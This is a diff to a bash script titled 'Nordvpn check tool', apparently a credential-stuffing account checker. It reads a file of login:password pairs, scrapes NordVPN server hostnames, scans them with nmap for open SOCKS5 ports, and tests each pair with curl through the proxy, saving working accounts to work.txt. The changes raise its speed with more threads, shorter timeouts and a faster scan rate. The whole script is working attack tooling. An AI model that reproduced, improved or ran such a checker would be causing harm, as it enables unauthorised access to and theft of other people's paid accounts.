@@ -1,5 +1,5 @@
 if [[ $# -eq 0 ]] ; then
-    echo 'Nordvpn check tool v1'
+    echo 'Nordvpn check tool v1.2'
     echo 'Created by matrix'
     echo 'Run like bash chk2.sh filename.txt'
     echo 'filename.txt must be in login:password format'
@@ -7,7 +7,7 @@ if [[ $# -eq 0 ]] ; then
     exit 0
 fi
 
-echo 'Nordvpn check tool v1'
+echo 'Nordvpn check tool v1.2'
 echo 'Created by matrix'
 echo 'Working proxy accounts will be stored into work.txt'
 sleep 3
@@ -15,18 +15,18 @@ sleep 3
 fn=$1
 t=`wc -l $fn`
 out=work.txt
-threads=120
+threads=190
 ct=0
 cct=0
 
 echo Getting proxy list
-curl --silent "https://api.nordvpn.com/v1/servers/recommendations" | jq --raw-output 'limit(100;.[]) | .hostname' >/tmp/tm0
+curl -i -s https://nordvpn.com/ru/ovpn/ |grep '<span class="mr-2">'|cut -d\> -f2|cut -d\< -f1|shuf -n 150 >/tmp/tm0
 echo Check with nmap open ports
-nmap -Pn -n --open -p1080 -iL /tmp/tm0|grep "report for"|awk '{print $5}'>/tmp/tm1;echo Proxy list is count `wc -l /tmp/tm1` of `wc -l /tmp/tm0`;cat /tmp/tm1
+nmap -Pn -n --open --min-rate 500 -p1080 -iL /tmp/tm0|grep "report for"|awk '{print $5}'>/tmp/tm1;echo Proxy list is count `wc -l /tmp/tm1` of `wc -l /tmp/tm0`;cat /tmp/tm1
 echo _________________________________
 echo Starting total for checking $t
 echo _________________________________
-
+cat $fn|tr -d "\r" >$fn.tmp; mv $fn.tmp $fn
 pr=`shuf -n 1 /tmp/tm1`
 
 while read p; do
@@ -51,7 +51,7 @@ while read p; do
   set -- "$p" 
   IFS=":"; declare -a Array=($*)  
   
-  (curl --connect-timeout 20 -m 60 -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 2ip.ru >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
+  (curl --connect-timeout 8 -m 20 -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 2ip.ru >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
 done < $fn
 
 
